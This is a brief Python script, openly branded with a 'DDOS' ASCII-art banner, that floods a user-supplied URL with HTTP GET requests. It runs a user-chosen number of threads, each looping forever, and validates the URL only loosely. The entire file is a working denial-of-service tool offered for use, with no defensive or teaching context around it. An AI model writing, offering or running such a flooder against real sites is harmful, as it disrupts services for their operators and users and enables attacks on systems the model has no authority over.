import colorama
import threading
import requests
 
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Request sent!")
        except requests.exceptions.ConnectionError:
            print("[!!!] " + "Connection error!")
 
threads = 20

print("""

DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS

""")


url = input("Enter URL>> ")
 
try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")
 
if threads == 0:
    exit("Threads count is incorrect!")
 
if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")
 
if not url.__contains__("."):
    exit("Invalid domain!")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")